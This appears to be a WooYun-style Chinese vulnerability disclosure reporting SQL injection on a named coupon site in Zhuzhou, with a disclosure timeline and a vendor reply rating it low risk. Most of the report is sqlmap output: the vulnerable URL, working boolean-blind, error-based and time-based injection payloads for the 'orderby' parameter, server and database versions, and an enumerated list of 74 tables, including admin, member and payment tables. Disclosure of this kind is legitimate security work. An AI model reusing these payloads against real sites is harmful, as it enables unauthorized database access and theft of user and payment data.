wybug_title: 株洲在线某站存在SQL注入漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-12-09：	细节已通知厂商并且等待厂商处理中									2015-12-10：	厂商已经确认，细节仅向厂商公开									2015-12-20：	细节向核心白帽子及相关领域专家公开									2015-12-30：	细节向普通白帽子公开									2016-01-09：	细节向实习白帽子公开									2016-01-23：	细节向公众公开  简要描述：  详细说明：  
http://quan.zzz4.com/index.php?act=coupon&area_id=&city_id=2&class_id=&class_id_1=&mall_id=&op=list&orderby=1&sort=asc



sqlmap resumed the following injection point(s) from stored session:---Parameter: orderby (GET)    Type: boolean-based blind    Title: MySQL >= 5.0 boolean-based blind - Parameter replace    Payload: act=coupon&area_id=&city_id=2&class_id=&class_id_1=&mall_id=&op=list&orderby=(SELECT (CASE WHEN (8351=8351) THEN 8351 ELSE 8351*(SELECT 8351 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))&sort=asc    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: act=coupon&area_id=&city_id=2&class_id=&class_id_1=&mall_id=&op=list&orderby=1 AND (SELECT 9926 FROM(SELECT COUNT(*),CONCAT(0x71786b7071,(SELECT (ELT(9926=9926,1))),0x717a717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&sort=asc    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: act=coupon&area_id=&city_id=2&class_id=&class_id_1=&mall_id=&op=list&orderby=1 AND (SELECT * FROM (SELECT(SLEEP(5)))mprY)&sort=asc---web application technology: Nginx, PHP 5.3.29back-end DBMS: MySQL 5.0Database: z4quan_db[74 tables]+------------------------+| old_brand              || sq_activity            || sq_activity_member     || sq_admin               || sq_adv_position        || sq_appointment         || sq_area                || sq_area_bak            || sq_article             || sq_article_class       || sq_brand               || sq_card_member         || sq_card_record         || sq_circle              || sq_circle_affix        || sq_circle_class        || sq_circle_classgc      || sq_circle_explog       || sq_circle_expmember    || sq_circle_exptheme     || sq_circle_fs           || sq_circle_inform       || sq_circle_like         || sq_circle_mapply       || sq_circle_member       || sq_circle_ml           || sq_circle_mldefault    || sq_circle_mlref        || sq_circle_recycle      || sq_circle_thclass      || sq_circle_theme        || sq_circle_thg          || sq_circle_thpoll       || sq_circle_thpolloption || sq_circle_thpollvoter  || sq_circle_threply      || sq_comment             || sq_comment_pic         || sq_coupon              || sq_coupon_code         || sq_coupon_download     || sq_document            || sq_favorites           || sq_gift                || sq_gift_order          || sq_goods               || sq_groupbuy            || sq_groupbuy_remind     || sq_mb_ad               || sq_mb_category         || sq_mb_feedback         || sq_mb_home             || sq_mb_user_token       || sq_member              || sq_member_degree       || sq_member_more         || sq_navigation          || sq_order               || sq_order_pwd           || sq_payment             || sq_point_log           || sq_predeposit_charge   || sq_predeposit_log      || sq_refund              || sq_score_setting       || sq_seo                 || sq_setting             || sq_settle              || sq_store               || sq_store47             || sq_store_class         || sq_store_label         || sq_upload              || sq_xght                |+------------------------+

wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2015-12-10 10:56 厂商回复： 谢谢检测 最新状态： 暂无
